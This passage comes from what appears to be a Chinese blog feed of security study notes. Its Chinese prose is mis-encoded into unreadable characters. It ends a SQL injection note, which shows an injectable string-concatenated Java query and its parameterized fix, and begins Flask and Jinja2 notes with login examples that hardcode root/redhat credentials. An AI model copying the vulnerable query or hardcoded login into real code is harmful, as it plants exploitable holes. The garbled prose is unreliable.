<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PGSQL"><figure class="iseeu highlight /pgsql"><table><tr><td class="code"><pre><span class="line">String query = &quot;SELECT * FROM products WHERE category = &#x27;&quot;+ <span class="keyword">input</span> + &quot;&#x27;&quot;;</span><br><span class="line"><span class="keyword">Statement</span> <span class="keyword">statement</span> = <span class="keyword">connection</span>.createStatement();</span><br><span class="line">ResultSet resultSet = <span class="keyword">statement</span>.executeQuery(query);</span><br></pre></td></tr></table></figure></div>
<p>å¯ä»¥é‡å†™æ­¤ä»£ç ï¼Œä»¥é˜²æ­¢ç”¨æˆ·è¾“å…¥å¹²æ‰°æŸ¥è¯¢ç»“æ„ï¼š</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PGSQL"><figure class="iseeu highlight /pgsql"><table><tr><td class="code"><pre><span class="line">PreparedStatement <span class="keyword">statement</span> = <span class="keyword">connection</span>.prepareStatement(&quot;SELECT * FROM products WHERE category = ?&quot;);</span><br><span class="line"><span class="keyword">statement</span>.setString(<span class="number">1</span>, <span class="keyword">input</span>);</span><br><span class="line">ResultSet resultSet = <span class="keyword">statement</span>.executeQuery();</span><br></pre></td></tr></table></figure></div>

<p>å¯¹äºä¸å—ä¿¡ä»»çš„è¾“å…¥ä½œä¸ºæŸ¥è¯¢ä¸­çš„æ•°æ®å‡ºç°çš„ä»»ä½•æƒ…å†µï¼Œ éƒ½å¯ä»¥ä½¿ç”¨å‚æ•°åŒ–æŸ¥è¯¢ï¼ŒåŒ…æ‹¬WHEREå­å¥å’ŒINSERTæˆ–UPDATEè¯­å¥ä¸­çš„å€¼ã€‚å®ƒä»¬ä¸èƒ½ç”¨äºå¤„ç†æŸ¥è¯¢å…¶ä»–éƒ¨åˆ†ä¸­çš„ä¸å—ä¿¡ä»»çš„è¾“å…¥ï¼Œä¾‹å¦‚è¡¨æˆ–åˆ—åç§°ï¼Œæˆ–ORDER BYå­å¥ã€‚å°†ä¸å—ä¿¡ä»»çš„æ•°æ®æ”¾å…¥æŸ¥è¯¢çš„è¿™äº›éƒ¨åˆ†çš„åº”ç”¨ç¨‹åºåŠŸèƒ½éœ€è¦é‡‡å–ä¸åŒçš„æ–¹æ³•ï¼Œä¾‹å¦‚ï¼š</p>
<ul>
<li>å°†å…è®¸çš„è¾“å…¥å€¼åˆ—å…¥ç™½åå•ã€‚</li>
<li>ä½¿ç”¨ä¸åŒçš„é€»è¾‘æ¥æä¾›æ‰€éœ€çš„è¡Œä¸ºã€‚</li>
</ul>
<p>ä¸ºäº†ä½¿å‚æ•°åŒ–æŸ¥è¯¢èƒ½å¤Ÿæœ‰æ•ˆé˜²æ­¢ SQL æ³¨å…¥ï¼ŒæŸ¥è¯¢ä¸­ä½¿ç”¨çš„å­—ç¬¦ä¸²å¿…é¡»å§‹ç»ˆæ˜¯ç¡¬ç¼–ç å¸¸é‡ã€‚å®ƒç»ä¸èƒ½åŒ…å«ä»»ä½•æ¥æºçš„å˜é‡æ•°æ®ã€‚ä¸è¦è¯•å›¾é€ä¸ªç¡®å®šæŸé¡¹æ•°æ®æ˜¯å¦å¯ä¿¡ï¼Œåœ¨è¢«è§†ä¸ºå®‰å…¨çš„æƒ…å†µä¸‹ç»§ç»­åœ¨æŸ¥è¯¢ä¸­ä½¿ç”¨å­—ç¬¦ä¸²è¿æ¥ã€‚å¾ˆå®¹æ˜“å¯¹æ•°æ®çš„å¯èƒ½æ¥æºäº§ç”Ÿé”™è¯¯åˆ¤æ–­ï¼Œæˆ–è€…å¯¹å…¶ä»–ä»£ç è¿›è¡Œæ›´æ”¹ä»¥æ±¡æŸ“å¯ä¿¡æ•°æ®ã€‚</p>
]]></content>
      <categories>
        <category>æ¼æ´</category>
        <category>ç¬”è®°</category>
      </categories>
      <tags>
        <tag>web</tag>
        <tag>ç¬”è®°</tag>
        <tag>æ¼æ´</tag>
      </tags>
  </entry>
  <entry>
    <title>flaskæ¡†æ¶&amp;&amp;sstiå­¦ä¹ ç¬”è®°</title>
    <url>/posts/53614.html</url>
    <content><![CDATA[<p>flaskæ¡†æ¶&amp;&amp;ssti å­¦ä¹ ç¬”è®°</p>
<span id="more"></span>
<p>æœ€è¿‘åšwebé¢˜çš„æ—¶å€™ç¢°åˆ°äº†å¾ˆå¤šflaskæ¡†æ¶ï¼Œæˆ‘æ„Ÿè§‰å¿…é¡»å¾—å­¦ä¸€ä¸‹è¿™ä¸ªæ¡†æ¶äº†ï¼Œè€Œä¸”è¿™ä¸ªé¢˜å¾ˆå¤šå’Œsstiç»“åˆçš„</p>
<h1 id="ä»€ä¹ˆæ˜¯flaskæ¡†æ¶"><a href="#ä»€ä¹ˆæ˜¯flaskæ¡†æ¶" class="headerlink" title="ä»€ä¹ˆæ˜¯flaskæ¡†æ¶"></a>ä»€ä¹ˆæ˜¯flaskæ¡†æ¶</h1><h2 id="flaskç®€ä»‹"><a href="#flaskç®€ä»‹" class="headerlink" title="flaskç®€ä»‹"></a>flaskç®€ä»‹</h2><p>Flask æ˜¯ä¸€ä¸ªç”¨ Python ç¼–å†™çš„è½»é‡çº§ Web åº”ç”¨æ¡†æ¶ï¼ŒåŸºäº Werkzeug WSGI å·¥å…·ç®±å’Œ Jinja2 æ¨¡æ¿å¼•æ“ã€‚<br>ä½œä¸ºä¸€ä¸ªå¾®æ¡†æ¶ï¼ŒFlask æä¾›æ ¸å¿ƒåŠŸèƒ½ï¼Œä½†æ²¡æœ‰å†…ç½®çš„æ•°æ®åº“æŠ½è±¡å±‚æˆ–è¡¨å•éªŒè¯å·¥å…·ã€‚è¿™ä½¿å¾—å¼€å‘è€…å¯ä»¥æ ¹æ®éœ€è¦é€‰æ‹©åˆé€‚çš„æ‰©å±•æ¥æ·»åŠ åŠŸèƒ½ï¼Œä¿æŒäº†æ¡†æ¶çš„çµæ´»æ€§ã€‚Flask è¢«ç§°ä¸ºâ€œå¾®æ¡†æ¶â€ï¼Œå› ä¸ºå®ƒä½¿ç”¨ç®€å•çš„æ ¸å¿ƒï¼Œç”¨æ‰©å±•å¢åŠ å…¶ä»–åŠŸèƒ½ã€‚</p>
<p>Flask çš„ä¸»è¦ç‰¹ç‚¹åŒ…æ‹¬ï¼š</p>
<ul>
<li>å†…å»ºå¼€å‘ç”¨æœåŠ¡å™¨å’Œè°ƒè¯•å™¨</li>
<li>é›†æˆçš„å•å…ƒæµ‹è¯•æ”¯æŒ</li>
<li>RESTful è¯·æ±‚åˆ†æ´¾</li>
<li>ä½¿ç”¨ Jinja2 æ¨¡æ¿å¼•æ“</li>
<li>æ”¯æŒå®‰å…¨ cookieï¼ˆå®¢æˆ·ç«¯ä¼šè¯ï¼‰</li>
<li>å®Œå…¨å…¼å®¹ WSGI 1.0</li>
<li>åŸºäº Unicode</li>
<li>è¯¦ç»†çš„æ–‡æ¡£å’Œæ•™ç¨‹</li>
<li>å…¼å®¹ Google App Engine</li>
<li>å¯é€šè¿‡æ‰©å±•å¢åŠ å…¶ä»–åŠŸèƒ½<br>ç”¨flaskåˆ›å»ºä¸€ä¸ªwebåº”ç”¨çš„ç®€å•ç¤ºä¾‹ï¼š</li>
</ul>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hello</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;Hello World!&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run()</span><br></pre></td></tr></table></figure></div>
<h2 id="è·¯ç”±å’Œè§†å›¾å‡½æ•°"><a href="#è·¯ç”±å’Œè§†å›¾å‡½æ•°" class="headerlink" title="è·¯ç”±å’Œè§†å›¾å‡½æ•°"></a>è·¯ç”±å’Œè§†å›¾å‡½æ•°</h2><p>åœ¨ Flask æ¡†æ¶ä¸­ï¼Œè·¯ç”± å’Œ è§†å›¾å‡½æ•° æ˜¯æ„å»º Web åº”ç”¨çš„æ ¸å¿ƒæ¦‚å¿µ</p>
<p>è·¯ç”±ï¼šå®šä¹‰äº† URL ä¸è§†å›¾å‡½æ•°ä¹‹é—´çš„æ˜ å°„å…³ç³»ã€‚å½“ç”¨æˆ·è®¿é—®ç‰¹å®šçš„ URL æ—¶ï¼ŒFlask æ ¹æ®è·¯ç”±è§„åˆ™è°ƒç”¨ç›¸åº”çš„è§†å›¾å‡½æ•°å¤„ç†è¯·æ±‚ã€‚<br>è§†å›¾å‡½æ•°ï¼šå¤„ç†ç‰¹å®š URL è¯·æ±‚çš„å‡½æ•°ï¼Œé€šå¸¸è¿”å›ä¸€ä¸ªå“åº”ï¼Œä¾‹å¦‚ HTML é¡µé¢æˆ– JSON æ•°æ®ã€‚<br>åŠ¨æ€è·¯ç”±ä¸å˜é‡è§„åˆ™ï¼š<br>&emsp;Flask æ”¯æŒåœ¨è·¯ç”±ä¸­å®šä¹‰åŠ¨æ€éƒ¨åˆ†ï¼Œå…è®¸åœ¨ URL ä¸­æ•è·å˜é‡ã€‚<br>å¸¸ç”¨çš„åŠ¨æ€è·¯ç”±è§„åˆ™åŒ…æ‹¬ï¼š</p>
<ol>
<li>URL è·¯ç”±çš„ä¸€éƒ¨åˆ†å¯ä»¥æ ‡è®°ä¸ºå˜é‡ï¼šä½¿ç”¨å°–æ‹¬å· &lt;å˜é‡å&gt; è¡¨ç¤ºã€‚ä¾‹å¦‚ï¼Œ&#x2F;user&#x2F;<username>&#x2F;ã€‚</li>
<li>æŒ‡å®šå˜é‡ç±»å‹ï¼šå¯ä»¥åœ¨å˜é‡åå‰æ·»åŠ ç±»å‹è¯´æ˜ï¼Œå¦‚ intã€stringã€floatã€uuid ç­‰ã€‚æ ¼å¼ä¸º &lt;ç±»å‹:å˜é‡å&gt;ã€‚</li>
<li>ç¤ºä¾‹ï¼š<br>å®šä¹‰ä¸€ä¸ªæ•´æ•°ç±»å‹çš„åŠ¨æ€è·¯ç”±ï¼š</li>
</ol>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&lt;int:id&gt;/comments/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">comments</span>(<span class="params"><span class="built_in">id</span></span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="string">f&quot;è¿™æ˜¯ä¸€ä¸ª <span class="subst">&#123;<span class="built_in">id</span>&#125;</span> çš„è¯„è®ºé¡µé¢&quot;</span></span><br></pre></td></tr></table></figure></div>
<p>å®šä¹‰ä¸€ä¸ªå­—ç¬¦ä¸²ç±»å‹çš„åŠ¨æ€è·¯ç”±ï¼š</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/welcome/&lt;string:username&gt;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">welcome</span>(<span class="params">username</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="string">f&quot;&lt;h1&gt;æ¬¢è¿ç”¨æˆ· <span class="subst">&#123;username&#125;</span> ç™»é™†ç½‘ç«™&lt;/h1&gt;&quot;</span></span><br></pre></td></tr></table></figure></div>
<h2 id="å¸¸è§å‡½æ•°"><a href="#å¸¸è§å‡½æ•°" class="headerlink" title="å¸¸è§å‡½æ•°"></a>å¸¸è§å‡½æ•°</h2><ul>
<li>render_template: ç”¨äºæ¸²æŸ“æ¨¡æ¿å¹¶è¿”å›åŒ…å«åŠ¨æ€å†…å®¹çš„ HTML é¡µé¢ã€‚å®ƒçš„ä¸»è¦ä½œç”¨æ˜¯å°†æ¨¡æ¿æ–‡ä»¶ä¸æ•°æ®ç»“åˆï¼Œç”Ÿæˆæœ€ç»ˆçš„ HTML å“åº”ã€‚<br>ç¤ºä¾‹</li>
</ul>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, render_template</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/home&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">home</span>():</span><br><span class="line">    user = &#123;<span class="string">&#x27;username&#x27;</span>: <span class="string">&#x27;Alice&#x27;</span>&#125;</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;home.html&#x27;</span>, user=user)</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
<ul>
<li>redirect: ç”¨äºå°†å®¢æˆ·ç«¯é‡å®šå‘åˆ°ä¸åŒçš„ URLã€‚<br>ç¤ºä¾‹</li>
</ul>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/logout&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">logout</span>():</span><br><span class="line">    <span class="comment"># æ‰§è¡Œæ³¨é”€é€»è¾‘</span></span><br><span class="line">    <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;index&#x27;</span>))</span><br></pre></td></tr></table></figure></div>
<ul>
<li>url_for(endpoint, **values)ï¼šç”ŸæˆæŒ‡å®šè§†å›¾å‡½æ•°çš„ URLã€‚å¸¸ç”¨äºåœ¨æ¨¡æ¿æˆ–è§†å›¾å‡½æ•°ä¸­åŠ¨æ€ç”Ÿæˆé“¾æ¥ã€‚</li>
</ul>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">with</span> app.test_request_context():</span><br><span class="line">    <span class="built_in">print</span>(url_for(<span class="string">&#x27;index&#x27;</span>))  <span class="comment"># è¾“å‡º: &#x27;/&#x27;</span></span><br><span class="line">    <span class="built_in">print</span>(url_for(<span class="string">&#x27;login&#x27;</span>))  <span class="comment"># è¾“å‡º: &#x27;/login&#x27;</span></span><br></pre></td></tr></table></figure></div>
<ul>
<li>request: è·å–å½“å‰è¯·æ±‚çš„æ•°æ®ï¼Œä¾‹å¦‚è¡¨å•æ•°æ®ã€æŸ¥è¯¢å‚æ•°ã€æ–‡ä»¶ç­‰ã€‚</li>
<li>session: ç”¨äºå­˜å‚¨ä¼šè¯æ•°æ®ï¼Œé€šå¸¸ç”¨äºä¿å­˜ç”¨æˆ·çš„ç™»å½•çŠ¶æ€ç­‰ä¿¡æ¯ã€‚</li>
<li>before_first_request: åœ¨å¤„ç†ç¬¬ä¸€ä¸ªè¯·æ±‚ä¹‹å‰æ‰§è¡Œçš„å‡½æ•°ã€‚</li>
<li>before_requestï¼šåœ¨æ¯ä¸ªè¯·æ±‚ä¹‹å‰æ‰§è¡Œçš„å‡½æ•°ã€‚</li>
<li>teardown_requestï¼šåœ¨æ¯ä¸ªè¯·æ±‚ç»“æŸæ—¶æ‰§è¡Œçš„å‡½æ•°ï¼Œæ— è®ºè¯·æ±‚æ˜¯å¦æˆåŠŸã€‚</li>
<li>context_processorï¼šç”¨äºåœ¨æ¨¡æ¿ä¸­è‡ªåŠ¨æä¾›å…¨å±€å˜é‡çš„å‡½æ•°ã€‚</li>
</ul>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, render_template</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.context_processor</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">inject_user</span>():</span><br><span class="line">    user = &#123;<span class="string">&#x27;username&#x27;</span>: <span class="string">&#x27;Alice&#x27;</span>&#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">dict</span>(user=user)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;index.html&#x27;</span>)</span><br></pre></td></tr></table></figure></div>
<h2 id="ç™»å½•éªŒè¯ä¹‹HTTPè¯·æ±‚æ–¹æ³•"><a href="#ç™»å½•éªŒè¯ä¹‹HTTPè¯·æ±‚æ–¹æ³•" class="headerlink" title="ç™»å½•éªŒè¯ä¹‹HTTPè¯·æ±‚æ–¹æ³•"></a>ç™»å½•éªŒè¯ä¹‹HTTPè¯·æ±‚æ–¹æ³•</h2><p>httpè¯·æ±‚æ–¹æ³•</p>
<ul>
<li>GETæ–¹æ³•<br>1.è·å–é¡µé¢ä¿¡æ¯<br>2.å¯ä»¥æäº¤æ•°æ®ä¿¡æ¯ï¼Œä½†ä¿¡æ¯æ•°æ®ä¸å®‰å…¨ï¼Œä¼šæ˜¾ç¤ºç”¨æˆ·å¸å·å¯†ç </li>
<li>POSTæ–¹æ³•<br>æäº¤æœåŠ¡ç«¯éœ€è¦çš„è¯·æ±‚ä¿¡æ¯ï¼Œurlä¸ä¼šæ˜¾ç¤ºç”¨æˆ·çš„ç›¸å…³ä¿¡æ¯ï¼Œæœ‰åˆ©äºæ•°æ®çš„å®‰å…¨æ€§</li>
<li>PUTæ–¹æ³•<br>ç”¨æˆ·å‘æœåŠ¡å™¨æŒ‡å®šurlä¸Šä¼ èµ„æº</li>
<li>DELETEæ–¹æ³•<br>ç”¨æˆ·å‘æœåŠ¡å™¨æŒ‡å®šurlåˆ é™¤èµ„æº</li>
</ul>
<p>getè¯·æ±‚æ–¹å¼ç¤ºä¾‹</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, render_template, request, redirect</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span>  <span class="string">&quot;&lt;h1&gt;ä¸»é¡µ&lt;/h1&gt;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/login/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">login</span>():</span><br><span class="line">    <span class="comment"># ä¸€èˆ¬æƒ…å†µï¼Œ ä¸ä¼šç›´æ¥æŠŠhtmlæ–‡ä»¶å†…å®¹ç›´æ¥è¿”å›ï¼›</span></span><br><span class="line">    <span class="comment"># è€Œæ˜¯å°†htmlæ–‡ä»¶ä¿å­˜åˆ°å½“å‰çš„templatesç›®å½•ä¸­ï¼›</span></span><br><span class="line">    <span class="comment">#       1). é€šè¿‡render_templateæ–¹æ³•è°ƒç”¨;</span></span><br><span class="line">    <span class="comment">#       2). é»˜è®¤æƒ…å†µä¸‹,Flask åœ¨ç¨‹åºæ–‡ä»¶å¤¹ä¸­çš„ templates å­æ–‡ä»¶å¤¹ä¸­å¯»æ‰¾æ¨¡æ¿ã€‚</span></span><br><span class="line">    <span class="keyword">return</span>  render_template(<span class="string">&#x27;login.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/login2/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">login2</span>():</span><br><span class="line">    <span class="comment"># è·å–ç”¨æˆ·è¾“å…¥çš„ç”¨æˆ·å</span></span><br><span class="line">    username = request.args.get(<span class="string">&#x27;username&#x27;</span>, <span class="literal">None</span>)</span><br><span class="line">    password = request.args.get(<span class="string">&#x27;password&#x27;</span>, <span class="literal">None</span>)</span><br><span class="line">    <span class="comment"># é€»è¾‘å¤„ç†ï¼Œ ç”¨æ¥åˆ¤æ–­ç”¨æˆ·å’Œå¯†ç æ˜¯å¦æ­£ç¡®;</span></span><br><span class="line">    <span class="keyword">if</span> username == <span class="string">&#x27;root&#x27;</span> <span class="keyword">and</span> password == <span class="string">&#x27;redhat&#x27;</span>:</span><br><span class="line">        <span class="comment"># é‡å®šå‘åˆ°æŒ‡å®šè·¯ç”±ï¼›</span></span><br><span class="line">        <span class="keyword">return</span>  redirect(<span class="string">&#x27;/&#x27;</span>)</span><br><span class="line">        <span class="comment"># return &quot;ç™»å½•æˆåŠŸ&quot;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span>  <span class="string">&quot;ç™»å½•å¤±è´¥&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run()</span><br></pre></td></tr></table></figure></div>
<p>post</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span>  Flask, request, render_template, redirect</span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span>  <span class="string">&quot;è¿™æ˜¯ä¸»é¡µ&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># é»˜è®¤è·¯ç”±åªæ”¯æŒgetæ–¹æ³•ï¼Œ å¦‚ä½•æŒ‡å®šæ¥å—postæ–¹æ³•?</span></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/login/&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">login</span>():</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">        <span class="comment"># éš¾ç‚¹: postè¯·æ±‚æäº¤çš„æ•°æ®å¦‚ä½•è·å–?</span></span><br><span class="line">        <span class="built_in">print</span>(request.form)</span><br><span class="line">        username = request.form.get(<span class="string">&#x27;username&#x27;</span>, <span class="literal">None</span>)</span><br><span class="line"></span><br><span class="line">        password = request.form.get(<span class="string">&#x27;password&#x27;</span>, <span class="literal">None</span>)</span><br><span class="line">        <span class="comment"># å¦‚æœç”¨æˆ·åå’Œå¯†ç æ­£ç¡®ï¼Œ è·³è½¬åˆ°ä¸»é¡µ;</span></span><br><span class="line">        <span class="keyword">if</span> username == <span class="string">&#x27;root&#x27;</span> <span class="keyword">and</span> password == <span class="string">&#x27;redhat&#x27;</span>:</span><br><span class="line">            <span class="keyword">return</span>  redirect(<span class="string">&#x27;/&#x27;</span>)</span><br><span class="line">        <span class="comment"># å¦‚æœç™»å½•ä¸æ­£ç¡®ï¼Œ åˆ™è­¦å‘Šçº¢è‰²ä¿¡æ¯;è¿˜æ˜¯åœ¨ç™»å½•é¡µé¢;</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="comment"># å¯ä»¥ç»™htmlä¼ é€’å˜é‡</span></span><br><span class="line">            <span class="keyword">return</span>  render_template(<span class="string">&#x27;login_post.html&#x27;</span>,</span><br><span class="line">                                    errMessages=<span class="string">&quot;ç”¨æˆ·åæˆ–è€…å¯†ç é”™è¯¯&quot;</span></span><br><span class="line">                                    )</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span>  render_template(<span class="string">&#x27;login_post.html&#x27;</span>)</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run()</span><br></pre></td></tr></table></figure></div>
<h2 id="æ¨¡æ¿jinja2"><a href="#æ¨¡æ¿jinja2" class="headerlink" title="æ¨¡æ¿jinja2"></a>æ¨¡æ¿jinja2</h2><h3 id="ä»€ä¹ˆæ˜¯Jinja2æ¨¡æ¿å¼•æ“"><a href="#ä»€ä¹ˆæ˜¯Jinja2æ¨¡æ¿å¼•æ“" class="headerlink" title="ä»€ä¹ˆæ˜¯Jinja2æ¨¡æ¿å¼•æ“?"></a>ä»€ä¹ˆæ˜¯Jinja2æ¨¡æ¿å¼•æ“?</h3><p>1). pythonçš„Webå¼€å‘ä¸­ï¼Œ ä¸šåŠ¡é€»è¾‘(å®è´¨å°±æ˜¯è§†å›¾å‡½æ•°çš„å†…å®¹)å’Œé¡µé¢é€»è¾‘(htmlæ–‡ä»¶)åˆ†å¼€çš„ï¼Œ ä½¿å¾—ä»£ç çš„å¯è¯»æ€§å¢å¼ºï¼Œ ä»£ç å®¹æ˜“ç†è§£å’Œç»´æŠ¤ï¼›</p>
<p>2). æ¨¡æ¿æ¸²æŸ“: åœ¨htmlæ–‡ä»¶ä¸­ï¼Œé€šè¿‡åŠ¨æ€èµ‹å€¼ ï¼Œå°†é‡æ–°ç¿»è¯‘å¥½çš„htmlæ–‡ä»¶(æ¨¡æ¿å¼•æ“ç”Ÿæ•ˆ) è¿”å›ç»™ç”¨æˆ·çš„è¿‡ç¨‹ã€‚</p>
<p>3). å…¶ä»–çš„æ¨¡æ¿å¼•æ“: Mako, Template, Jinja2</p>
<h3 id="è¯­æ³•"><a href="#è¯­æ³•" class="headerlink" title="è¯­æ³•"></a>è¯­æ³•</h3><p>1). Jinja2å˜é‡æ˜¾ç¤ºè¯­æ³•: <code>&#123;&#123; å˜é‡å &#125;&#125;</code><br>Jinja2å˜é‡å†…ç½®è¿‡æ»¤å™¨:<br>    safe æ¸²æŸ“å€¼æ—¶ä¸è½¬ä¹‰<br>    capitalize æŠŠå€¼çš„é¦–å­—æ¯è½¬æ¢æˆå¤§å†™,å…¶ä»–å­—æ¯è½¬æ¢æˆå°å†™<br>    lower æŠŠå€¼è½¬æ¢æˆå°å†™å½¢å¼<br>    upper æŠŠå€¼è½¬æ¢æˆå¤§å†™å½¢å¼<br>    title æŠŠå€¼ä¸­æ¯ä¸ªå•è¯çš„é¦–å­—æ¯éƒ½è½¬æ¢æˆå¤§å†™<br>    trim æŠŠå€¼çš„é¦–å°¾ç©ºæ ¼å»æ‰<br>    striptags æ¸²æŸ“ä¹‹å‰æŠŠå€¼ä¸­æ‰€æœ‰çš„ HTML æ ‡ç­¾éƒ½åˆ æ‰<br>è‡ªå®šä¹‰è¿‡æ»¤å™¨</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.template_filter(<span class="params"><span class="string">&#x27;capitalize&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">capitalize_filter</span>(<span class="params">text</span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">isinstance</span>(text, <span class="built_in">str</span>):</span><br><span class="line">        <span class="keyword">return</span> text.capitalize()</span><br><span class="line">    <span class="keyword">return</span> text</span><br></pre></td></tr></table></figure></div>
<p>åœ¨æ¨¡æ¿ä¸­ä½¿ç”¨è¯¥è¿‡æ»¤å™¨ï¼š<br><code>&lt;p&gt;&#123;&#123; 'hello world' | capitalize &#125;&#125;&lt;/p&gt;</code><br>é€šè¿‡ç®¡é“ç¬¦ | å°†å˜é‡ä¼ é€’ç»™è¿‡æ»¤å™¨ã€‚å¯ä»¥é“¾å¼ä½¿ç”¨å¤šä¸ªè¿‡æ»¤å™¨<br>2). forå¾ªç¯:</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="DJANGO"><figure class="iseeu highlight /django"><table><tr><td class="code"><pre><span class="line"><span class="template-tag">&#123;% <span class="name"><span class="name">for</span></span> i <span class="keyword">in</span> li%&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml"></span><span class="template-tag">&#123;% <span class="name"><span class="name">endfor</span></span> %&#125;</span></span><br></pre></td></tr></table></figure></div>
<p>3). ifè¯­å¥</p>
